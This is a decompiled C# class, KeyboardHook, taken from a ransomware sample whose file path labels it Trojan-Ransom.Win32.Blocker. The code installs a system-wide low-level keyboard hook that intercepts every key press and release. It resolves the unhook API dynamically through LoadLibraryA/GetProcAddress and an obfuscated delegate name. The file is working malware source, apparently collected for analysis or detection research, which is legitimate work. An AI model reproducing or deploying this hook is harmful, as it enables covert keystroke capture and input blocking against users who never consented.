// Decompiled with JetBrains decompiler
// Type: KeyboardHook
// Assembly: hftest3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8D617626-385D-48BC-9558-2E30CBAF3705
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.aqnk-e4afbc332cac5f60afd9bb61024b069e3aef4fcc394c046ae7ba88b4f6ff29ed.exe

using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyboardHook
{
  private const int HC_ACTION = 0;
  private const int WH_KEYBOARD_LL = 13;
  private const int WM_KEYDOWN = 256;
  private const int WM_KEYUP = 257;
  private const int WM_SYSKEYDOWN = 260;
  private const int WM_SYSKEYUP = 261;
  private static int KeyHook;
  private static KeyboardHook.KeyboardProcDelegate KeyHookDelegate;

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr GetProcAddress(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

  [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int SetWindowsHookEx(
    int idHook,
    KeyboardHook.KeyboardProcDelegate lpfn,
    int hmod,
    int dwThreadId);

  public static event KeyboardHook.KeyDownEventHandler KeyDown;

  public static event KeyboardHook.KeyUpEventHandler KeyUp;

  public KeyboardHook()
  {
    KeyboardHook.KeyHookDelegate = new KeyboardHook.KeyboardProcDelegate(KeyboardHook.KeyboardProc);
    KeyboardHook.KeyHook = KeyboardHook.SetWindowsHookEx(13, KeyboardHook.KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
  }

  public T CreateAPI<T>(string name, string method) => (T) Marshal.GetDelegateForFunctionPointer(KeyboardHook.GetProcAddress(KeyboardHook.LoadLibraryA(ref name), ref method), typeof (T));

  private static int KeyboardProc(int nCode, int wParam, ref KeyboardHook.KBDLLHOOKSTRUCT lParam)
  {
    if (nCode == 0)
    {
      switch (wParam)
      {
        case 256:
        case 260:
          KeyboardHook.KeyDownEventHandler keyDownEvent = KeyboardHook.KeyDownEvent;
          if (keyDownEvent != null)
          {
            keyDownEvent((Keys) lParam.vkCode);
            break;
          }
          break;
        case 257:
        case 261:
          KeyboardHook.KeyUpEventHandler keyUpEvent = KeyboardHook.KeyUpEvent;
          if (keyUpEvent != null)
          {
            keyUpEvent((Keys) lParam.vkCode);
            break;
          }
          break;
      }
    }
    return 0;
  }

  ~KeyboardHook()
  {
    int num = this.CreateAPI<KeyboardHook.TAE2345ASD>("user32", "UnhookWindowsHookEx")(KeyboardHook.KeyHook);
    // ISSUE: explicit finalizer call
    base.Finalize();
  }

  private struct KBDLLHOOKSTRUCT
  {
    public int vkCode;
    public int scancode;
    public int flags;
    public int time;
    public int dwExtraInfo;
  }

  private delegate int TAE2345ASD(int hHook);

  private delegate int KeyboardProcDelegate(
    int nCode,
    int wParam,
    ref KeyboardHook.KBDLLHOOKSTRUCT lParam);

  public delegate void KeyDownEventHandler(Keys Key);

  public delegate void KeyUpEventHandler(Keys Key);
}
